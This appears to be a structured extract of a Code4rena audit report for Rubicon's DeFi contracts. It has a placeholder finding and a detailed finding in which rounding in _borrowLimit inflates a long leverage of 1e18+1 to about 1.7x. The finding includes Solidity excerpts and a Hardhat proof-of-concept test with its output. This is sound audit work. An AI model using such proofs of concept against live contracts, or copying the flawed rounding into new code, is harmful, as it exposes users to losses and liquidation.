{
  "doc_id": "github:code-423n4/2023-04-rubicon-findings",
  "source_pdf": "github:code-423n4/2023-04-rubicon-findings",
  "source_mtime": null,
  "extracted_at": "2025-11-19T10:34:18.254541+00:00",
  "extractor_version": "github-issues-0.1",
  "repositories": [
    {
      "url": "https://github.com/code-423n4/2023-04-rubicon",
      "org": "code-423n4",
      "repo": "2023-04-rubicon",
      "commit": "511636d889742296a54392875a35e4c0c4727bb7",
      "evidence": {
        "page": null,
        "snippet": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1201-L1202"
      }
    },
    {
      "url": "https://github.com/code-423n4/2023-04-rubicon",
      "org": "code-423n4",
      "repo": "2023-04-rubicon",
      "commit": null,
      "evidence": {
        "page": null,
        "snippet": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L578-L589"
      }
    },
    {
      "url": "https://github.com/RubiconDeFi/rubi-protocol-v2",
      "org": "RubiconDeFi",
      "repo": "rubi-protocol-v2",
      "commit": null,
      "evidence": {
        "page": null,
        "snippet": "https://github.com/RubiconDeFi/rubi-protocol-v2/blob/master/contracts/utilities/RubiconRouter.sol#L379-L418"
      }
    },
    {
      "url": "https://github.com/code-423n4/2022-09-y2k-finance-findings",
      "org": "code-423n4",
      "repo": "2022-09-y2k-finance-findings",
      "commit": null,
      "evidence": {
        "page": null,
        "snippet": "- https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/93"
      }
    },
    {
      "url": "https://github.com/OpenZeppelin/openzeppelin-contracts",
      "org": "OpenZeppelin",
      "repo": "openzeppelin-contracts",
      "commit": null,
      "evidence": {
        "page": null,
        "snippet": "The [`Pausable` implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol) contains all the logic to implement pausing, but doesn't include any..."
      }
    },
    {
      "url": "https://github.com/RubiconDeFi/rubi-protocol-v2",
      "org": "RubiconDeFi",
      "repo": "rubi-protocol-v2",
      "commit": "34db36c71b170c8f13941ab26eb7ada1288ec82f",
      "evidence": {
        "page": null,
        "snippet": "The `_borrowLimit` function is an internal view function used by [`openPosition`](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/contracts/utilities/pool..."
      }
    },
    {
      "url": "https://github.com/PierrickGT/2023-04-rubicon",
      "org": "PierrickGT",
      "repo": "2023-04-rubicon",
      "commit": "b57d4deac109dc677eafd171b69540c534f24563",
      "evidence": {
        "page": null,
        "snippet": "Foundry unit test available here: https://github.com/PierrickGT/2023-04-rubicon/blob/b57d4deac109dc677eafd171b69540c534f24563/test/audit-tests/Audit.t.sol#L165"
      }
    }
  ],
  "report_schema": [
    {
      "key": "Severity",
      "meaning": "How serious the impact of this finding is.",
      "expected_values": "Informational / Low / Medium / High"
    },
    {
      "key": "Difficulty",
      "meaning": "How hard it is to exploit this vulnerability.",
      "expected_values": "Low / Medium / High"
    },
    {
      "key": "Type",
      "meaning": "The category or nature of the vulnerability.",
      "expected_values": "String describing the type of vulnerability (e.g., Data Validation, Reentrancy)"
    },
    {
      "key": "Finding ID",
      "meaning": "A unique identifier for the specific finding.",
      "expected_values": "String with a consistent format (e.g., TOB-ELA-1)"
    },
    {
      "key": "Target",
      "meaning": "The location of the vulnerability in the codebase.",
      "expected_values": "Path to affected file / contract"
    }
  ],
  "vulnerability_sections": [
    {
      "index": 143,
      "page_start": null,
      "heading": "143. Placeholder",
      "heading_cleaned": "Placeholder",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/BathHouseV2.sol#L1\n\n\n# Vulnerability details\n\ne7ccd108905f7597341160997a8b1cee2ec890a32be476915ce4ef37ba4a5a53\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/BathHouseV2.sol#L1\n\n\n# Vulnerability details\n\ne7ccd108905f7597341160997a8b1cee2ec890a32be476915ce4ef37ba4a5a53",
      "description": null,
      "impact": null,
      "mitigation": null,
      "poc": null,
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/BathHouseV2.sol#L1\n\n**container:**\n# Vulnerability details\n\ne7ccd108905f7597341160997a8b1cee2ec890a32be476915ce4ef37ba4a5a53\n",
      "sections": {
        "description": null,
        "impact": null,
        "recommendation": null,
        "poc": null,
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/BathHouseV2.sol#L1\n\n**container:**\n# Vulnerability details\n\ne7ccd108905f7597341160997a8b1cee2ec890a32be476915ce4ef37ba4a5a53\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/BathHouseV2.sol#L1\n\n\n# Vulnerability details\n\ne7ccd108905f7597341160997a8b1cee2ec890a32be476915ce4ef37ba4a5a53\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 281,
      "page_start": null,
      "heading": "281. Due to the loss of precision, openPosition will make the user's leverage higher than expected",
      "heading_cleaned": "Due to the loss of precision, openPosition will make the user's leverage higher than expected",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L534\n\n\n# Vulnerability details\n\n## Impact\nopenPosition creates a leveraged position for the user based on initMargin and leverage, and in _borrowLimit, it calculates the number of borrowing loops needed to reach the desired amount.\n```solidity\n        (vars.limit, vars.lastBorrow) = _borrowLimit(\n            bathTokenAsset,\n            asset,\n            initMargin,\n            leverage\n        );\n```\nFor example, if initMargin = 1e18 and leverage = 2, then _desiredAmount = 2e18, and if the collateral factor is 0.7, the user's position after the first borrowing is 1e18 + 1e18 * 0.7 = 1.7e18, and the user's position after the second borrowing is 1e18 + 1e18 * 0.7 + 1e18 * 0.7 * 0.7 = 2.19e18.\n```solidity\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n            }\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n```\nFor the excess of 0.19e18, _lastBorrow is used as the percentage of the last borrow. It should be noted that when _lastBorrow = 0, it means that the percentage of this borrowing is 100%.\n```solidity\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n...\n            if (i.add(1) == vars.limit && vars.lastBorrow != 0) {\n                vars.toBorrow = vars.lastBorrow;\n            } else {\n                // otherwise borrow max amount available to borrow - 100% from _maxBorrow\n                vars.toBorrow = WAD;\n            }\n```\nAlthough the long leverage must be greater than 1e18, the user can make the long leverage == 1e18+1 to make the long leverage small, but in this case, the loss of precision in the calculation will cause the user to have a higher leverage than expected\n```solidity\n    function _leverageCheck(uint256 _leverage, bool _long) internal pure {\n        uint256 _wad = WAD;\n        uint256 _leverageMax = WAD.mul(3);\n\n        _long // long can't be with 1x leverage\n            ? require(\n                _leverage > _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Long}: INVLAID LEVERAGE\"\n            )\n            : require(\n                _leverage >= _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Short}: INVLAID LEVERAGE\"\n            );\n    }\n```\nConsider the following scenario\nThe collateral factor of WBTC is 0.7, alice provides 4e8 WBTC and 1e18+1 long leverage to call the buyAllAmountWithLeverage function.\nSince wmul is rounded rather than rounded up, the _desiredAmount calculated in _borrowLimit is equal to wmul(4e8,1e18+1) == 4e8\n```solidity\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n```\nAfter that, since _borrowDelta == 0, _borrowLimit returns limit == 1 and _lastBorrow == 0\n```solidity\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n```\nThen in openPosition, since _lastBorrow == 0, borrowing will be done so that alice's position reaches 4e8+4e8 * 0.7 = 6.8 WBTC, at which point alice's leverage is 1.7e18, much larger than alice's expectations, too high leverage will increase the risk of alice is liquidated.\n```solidity\n            if (i.add(1) == vars.limit && vars.lastBorrow != 0) {\n                vars.toBorrow = vars.lastBorrow;\n            } else {\n                // otherwise borrow max amount available to borrow - 100% from _maxBorrow\n                vars.toBorrow = WAD;\n            }\n\n            // increase bathToken amount in order to save it in positions map\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n```\n## Proof of Concept\nThe POC and output are as follows, it can be seen that the borrowed amount of 1e18+1 is greater than 1.25e18 and 1.337e18, and the actual leverage of 1e18+1 is 1.7e18\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"POC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        const x1_1 = parseUnits(\"1.000000000000000001\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_1\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount1 : %s\",position[2]);\n      });\n\n      it(\"POC2\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_25\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount2 : %s\",position[2]);\n\n      });\n      it(\"POC3\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_337\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount3 : %s\",position[2]);\n      });\n```\n\n```sh\nborrowedAmount1 : 252000\n        âœ“ POC1\nborrowedAmount2 : 90000\n        âœ“ POC2\nborrowedAmount3 : 121320\n        âœ“ POC3\n```\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L583\n## Tools Used\nhardhat\n## Recommended Mitigation Steps\nConsider rounding up in _borrowLimit when calculating _desiredAmount.\nOr consider not borrowing when _lastBorrow == 0 and modifying the logic of the rest of the code\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L534\n\n\n# Vulnerability details\n\n## Impact\nopenPosition creates a leveraged position for the user based on initMargin and leverage, and in _borrowLimit, it calculates the number of borrowing loops needed to reach the desired amount.\n```solidity\n        (vars.limit, vars.lastBorrow) = _borrowLimit(\n            bathTokenAsset,\n            asset,\n            initMargin,\n            leverage\n        );\n```\nFor example, if initMargin = 1e18 and leverage = 2, then _desiredAmount = 2e18, and if the collateral factor is 0.7, the user's position after the first borrowing is 1e18 + 1e18 * 0.7 = 1.7e18, and the user's position after the second borrowing is 1e18 + 1e18 * 0.7 + 1e18 * 0.7 * 0.7 = 2.19e18.\n```solidity\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n            }\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n```\nFor the excess of 0.19e18, _lastBorrow is used as the percentage of the last borrow. It should be noted that when _lastBorrow = 0, it means that the percentage of this borrowing is 100%.\n```solidity\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n...\n            if (i.add(1) == vars.limit && vars.lastBorrow != 0) {\n                vars.toBorrow = vars.lastBorrow;\n            } else {\n                // otherwise borrow max amount available to borrow - 100% from _maxBorrow\n                vars.toBorrow = WAD;\n            }\n```\nAlthough the long leverage must be greater than 1e18, the user can make the long leverage == 1e18+1 to make the long leverage small, but in this case, the loss of precision in the calculation will cause the user to have a higher leverage than expected\n```solidity\n    function _leverageCheck(uint256 _leverage, bool _long) internal pure {\n        uint256 _wad = WAD;\n        uint256 _leverageMax = WAD.mul(3);\n\n        _long // long can't be with 1x leverage\n            ? require(\n                _leverage > _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Long}: INVLAID LEVERAGE\"\n            )\n            : require(\n                _leverage >= _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Short}: INVLAID LEVERAGE\"\n            );\n    }\n```\nConsider the following scenario\nThe collateral factor of WBTC is 0.7, alice provides 4e8 WBTC and 1e18+1 long leverage to call the buyAllAmountWithLeverage function.\nSince wmul is rounded rather than rounded up, the _desiredAmount calculated in _borrowLimit is equal to wmul(4e8,1e18+1) == 4e8\n```solidity\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n```\nAfter that, since _borrowDelta == 0, _borrowLimit returns limit == 1 and _lastBorrow == 0\n```solidity\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n```\nThen in openPosition, since _lastBorrow == 0, borrowing will be done so that alice's position reaches 4e8+4e8 * 0.7 = 6.8 WBTC, at which point alice's leverage is 1.7e18, much larger than alice's expectations, too high leverage will increase the risk of alice is liquidated.\n```solidity\n            if (i.add(1) == vars.limit && vars.lastBorrow != 0) {\n                vars.toBorrow = vars.lastBorrow;\n            } else {\n                // otherwise borrow max amount available to borrow - 100% from _maxBorrow\n                vars.toBorrow = WAD;\n            }\n\n            // increase bathToken amount in order to save it in positions map\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n```\n## Proof of Concept\nThe POC and output are as follows, it can be seen that the borrowed amount of 1e18+1 is greater than 1.25e18 and 1.337e18, and the actual leverage of 1e18+1 is 1.7e18\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"POC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        const x1_1 = parseUnits(\"1.000000000000000001\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_1\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount1 : %s\",position[2]);\n      });\n\n      it(\"POC2\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_25\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount2 : %s\",position[2]);\n\n      });\n      it(\"POC3\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_337\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount3 : %s\",position[2]);\n      });\n```\n\n```sh\nborrowedAmount1 : 252000\n        âœ“ POC1\nborrowedAmount2 : 90000\n        âœ“ POC2\nborrowedAmount3 : 121320\n        âœ“ POC3\n```\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L583\n## Tools Used\nhardhat\n## Recommended Mitigation Steps\nConsider rounding up in _borrowLimit when calculating _desiredAmount.\nOr consider not borrowing when _lastBorrow == 0 and modifying the logic of the rest of the code",
      "description": null,
      "impact": "## Impact\nopenPosition creates a leveraged position for the user based on initMargin and leverage, and in _borrowLimit, it calculates the number of borrowing loops needed to reach the desired amount.\n```solidity\n        (vars.limit, vars.lastBorrow) = _borrowLimit(\n            bathTokenAsset,\n            asset,\n            initMargin,\n            leverage\n        );\n```\nFor example, if initMargin = 1e18 and leverage = 2, then _desiredAmount = 2e18, and if the collateral factor is 0.7, the user's position after the first borrowing is 1e18 + 1e18 * 0.7 = 1.7e18, and the user's position after the second borrowing is 1e18 + 1e18 * 0.7 + 1e18 * 0.7 * 0.7 = 2.19e18.\n```solidity\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n            }\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n```\nFor the excess of 0.19e18, _lastBorrow is used as the percentage of the last borrow. It should be noted that when _lastBorrow = 0, it means that the percentage of this borrowing is 100%.\n```solidity\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n...\n            if (i.add(1) == vars.limit && vars.lastBorrow != 0) {\n                vars.toBorrow = vars.lastBorrow;\n            } else {\n                // otherwise borrow max amount available to borrow - 100% from _maxBorrow\n                vars.toBorrow = WAD;\n            }\n```\nAlthough the long leverage must be greater than 1e18, the user can make the long leverage == 1e18+1 to make the long leverage small, but in this case, the loss of precision in the calculation will cause the user to have a higher leverage than expected\n```solidity\n    function _leverageCheck(uint256 _leverage, bool _long) internal pure {\n        uint256 _wad = WAD;\n        uint256 _leverageMax = WAD.mul(3);\n\n        _long // long can't be with 1x leverage\n            ? require(\n                _leverage > _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Long}: INVLAID LEVERAGE\"\n            )\n            : require(\n                _leverage >= _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Short}: INVLAID LEVERAGE\"\n            );\n    }\n```\nConsider the following scenario\nThe collateral factor of WBTC is 0.7, alice provides 4e8 WBTC and 1e18+1 long leverage to call the buyAllAmountWithLeverage function.\nSince wmul is rounded rather than rounded up, the _desiredAmount calculated in _borrowLimit is equal to wmul(4e8,1e18+1) == 4e8\n```solidity\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n```\nAfter that, since _borrowDelta == 0, _borrowLimit returns limit == 1 and _lastBorrow == 0\n```solidity\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n```\nThen in openPosition, since _lastBorrow == 0, borrowing will be done so that alice's position reaches 4e8+4e8 * 0.7 = 6.8 WBTC, at which point alice's leverage is 1.7e18, much larger than alice's expectations, too high leverage will increase the risk of alice is liquidated.\n```solidity\n            if (i.add(1) == vars.limit && vars.lastBorrow != 0) {\n                vars.toBorrow = vars.lastBorrow;\n            } else {\n                // otherwise borrow max amount available to borrow - 100% from _maxBorrow\n                vars.toBorrow = WAD;\n            }\n\n            // increase bathToken amount in order to save it in positions map\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n```\n",
      "mitigation": "## Recommended Mitigation Steps\nConsider rounding up in _borrowLimit when calculating _desiredAmount.\nOr consider not borrowing when _lastBorrow == 0 and modifying the logic of the rest of the code\n",
      "poc": "## Proof of Concept\nThe POC and output are as follows, it can be seen that the borrowed amount of 1e18+1 is greater than 1.25e18 and 1.337e18, and the actual leverage of 1e18+1 is 1.7e18\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"POC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        const x1_1 = parseUnits(\"1.000000000000000001\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_1\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount1 : %s\",position[2]);\n      });\n\n      it(\"POC2\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_25\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount2 : %s\",position[2]);\n\n      });\n      it(\"POC3\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_337\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount3 : %s\",position[2]);\n      });\n```\n\n```sh\nborrowedAmount1 : 252000\n        âœ“ POC1\nborrowedAmount2 : 90000\n        âœ“ POC2\nborrowedAmount3 : 121320\n        âœ“ POC3\n```\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L583\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L534\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nhardhat\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nopenPosition creates a leveraged position for the user based on initMargin and leverage, and in _borrowLimit, it calculates the number of borrowing loops needed to reach the desired amount.\n```solidity\n        (vars.limit, vars.lastBorrow) = _borrowLimit(\n            bathTokenAsset,\n            asset,\n            initMargin,\n            leverage\n        );\n```\nFor example, if initMargin = 1e18 and leverage = 2, then _desiredAmount = 2e18, and if the collateral factor is 0.7, the user's position after the first borrowing is 1e18 + 1e18 * 0.7 = 1.7e18, and the user's position after the second borrowing is 1e18 + 1e18 * 0.7 + 1e18 * 0.7 * 0.7 = 2.19e18.\n```solidity\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n            }\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n```\nFor the excess of 0.19e18, _lastBorrow is used as the percentage of the last borrow. It should be noted that when _lastBorrow = 0, it means that the percentage of this borrowing is 100%.\n```solidity\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n...\n            if (i.add(1) == vars.limit && vars.lastBorrow != 0) {\n                vars.toBorrow = vars.lastBorrow;\n            } else {\n                // otherwise borrow max amount available to borrow - 100% from _maxBorrow\n                vars.toBorrow = WAD;\n            }\n```\nAlthough the long leverage must be greater than 1e18, the user can make the long leverage == 1e18+1 to make the long leverage small, but in this case, the loss of precision in the calculation will cause the user to have a higher leverage than expected\n```solidity\n    function _leverageCheck(uint256 _leverage, bool _long) internal pure {\n        uint256 _wad = WAD;\n        uint256 _leverageMax = WAD.mul(3);\n\n        _long // long can't be with 1x leverage\n            ? require(\n                _leverage > _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Long}: INVLAID LEVERAGE\"\n            )\n            : require(\n                _leverage >= _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Short}: INVLAID LEVERAGE\"\n            );\n    }\n```\nConsider the following scenario\nThe collateral factor of WBTC is 0.7, alice provides 4e8 WBTC and 1e18+1 long leverage to call the buyAllAmountWithLeverage function.\nSince wmul is rounded rather than rounded up, the _desiredAmount calculated in _borrowLimit is equal to wmul(4e8,1e18+1) == 4e8\n```solidity\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n```\nAfter that, since _borrowDelta == 0, _borrowLimit returns limit == 1 and _lastBorrow == 0\n```solidity\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n```\nThen in openPosition, since _lastBorrow == 0, 